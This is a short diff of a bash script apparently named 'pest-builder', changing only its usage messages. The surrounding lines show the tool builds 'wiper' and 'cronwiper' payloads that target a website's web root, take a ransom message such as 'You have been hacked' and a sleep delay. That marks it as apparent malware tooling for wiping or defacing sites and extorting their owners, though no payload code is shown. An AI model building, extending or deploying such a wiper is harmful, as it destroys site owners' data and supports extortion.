@@ -53,8 +53,8 @@ done
 if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
     if [[ "$#" != 4 ]]; then
-        echo "Usage: build wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds";
-        echo "Example: build wiper /hom4/user/public_html \"You have been hacked\" 300";
+        echo "Usage: bash pest-builder wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds";
+        echo "Example: bash pest-builder wiper /hom4/user/public_html \"You have been hacked\" 300";
         exit
     fi
 
